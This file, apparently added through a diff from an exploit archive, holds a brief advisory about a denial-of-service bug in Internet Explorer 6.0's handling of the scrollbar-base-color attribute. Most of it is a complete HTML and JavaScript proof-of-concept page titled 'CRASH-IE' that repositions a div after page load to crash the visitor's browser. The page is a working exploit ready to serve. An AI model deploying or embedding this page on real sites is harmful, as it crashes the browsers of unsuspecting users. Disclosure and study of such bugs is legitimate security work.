@@ -1,0 +1,55 @@
+source: http://www.securityfocus.com/bid/8874/info
+
+It has been reported that Microsoft Internet Explorer is prone to a vulnerability that may allow an attacker to cause a denial of service condition in the software. The problem occurs due to improper handling of scrollbar-base-color attribute of the div object.
+
+Successful exploitation of this issue may allow an attacker to create a webpage containing malicious script code that would cause a user's browser to crash upon visiting the site.
+
+Microsoft Internet Explorer 6.0 has been reported to be vulnerable to this issue, however other versions may be affected as well.
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>CRASH-IE</title>
+<style type="text/css">
+html, body {
+overflow-y: hidden;
+scrollbar-base-color: '#330066';
+}
+
+.crash {
+position:absolute;
+left:200px;
+top:200px;
+width:200px;
+}
+
+</style>
+<script type="text/javascript">
+function galgenfrist() {
+window.setTimeout('crashIE();',1000);
+}
+
+function crashIE() {
+var moveNode = document.getElementById("move");
+if(moveNode) {
+moveNode.style.top = "100px";
+moveNode.style.left = "200px";
+}
+}
+</script>
+</head>
+<body onload="galgenfrist();">
+<h1>CRASH-IE</h1>
+<div id="move" class="crash">
+<table>
+<tbody>
+<tr>
+<td>
+<textarea>&lt;/textarea&gt;
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</body>
+</html>
